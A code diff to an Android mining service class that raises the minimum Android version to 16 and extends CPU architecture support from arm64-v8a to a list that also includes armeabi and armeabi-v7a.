@@ -30,6 +30,10 @@ import android.os.IBinder;
 import android.os.Looper;
 import android.os.SystemClock;
 
+import java.util.ArrayList;
+import java.util.Arrays;
+import java.util.List;
+
 import waterhole.miner.core.CallbackService;
 import waterhole.miner.core.MineCallback;
 import waterhole.miner.core.controller.AdjustController;
@@ -39,7 +43,7 @@ import waterhole.miner.core.controller.TemperatureController;
 import waterhole.miner.core.utils.SpUtil;
 
 import static waterhole.miner.core.asyn.AsyncTaskAssistant.executeOnThreadPool;
-import static waterhole.miner.core.utils.APIUtils.hasICS;
+import static waterhole.miner.core.utils.APIUtils.hasJellyBean;
 import static waterhole.miner.core.utils.LogUtils.error;
 import static waterhole.miner.core.utils.LogUtils.info;
 import static waterhole.miner.core.utils.LogUtils.errorWithReport;
@@ -53,6 +57,8 @@ public final class MineService extends Service implements ITempTask {
     private final Handler mMainHandler = new Handler(Looper.getMainLooper());
 
     private MineCallback mineCallback;
+
+    private final static String[] SUPPORTED_ARCHITECTURES = {"armeabi", "armeabi-v7a", "arm64-v8a"};
 
     @Override
     public void start(final int[] temperatureSurface) {
@@ -121,14 +127,14 @@ public final class MineService extends Service implements ITempTask {
 
             if (mineCallback == null) continue;
             try {
-                if (!hasICS()) {
-                    mineCallback.onMiningError("Android version must be >= 14");
+                if (!hasJellyBean()) {
+                    mineCallback.onMiningError("Android version must be >= 16");
                     return;
                 }
                 final String cpuABI = Build.CPU_ABI;
                 info(cpuABI);
-                if (!cpuABI.toLowerCase().equals("arm64-v8a")) {
-                    mineCallback.onMiningError("Sorry, this app currently only supports 64 bit architectures, but yours is " + cpuABI);
+                if (!Arrays.asList(SUPPORTED_ARCHITECTURES).contains(cpuABI.toLowerCase())) {
+                    mineCallback.onMiningError("Sorry, this app currently only supports " + Arrays.toString(SUPPORTED_ARCHITECTURES) + ", but yours is " + cpuABI);
                     return;
                 }
             } catch (Exception e) {
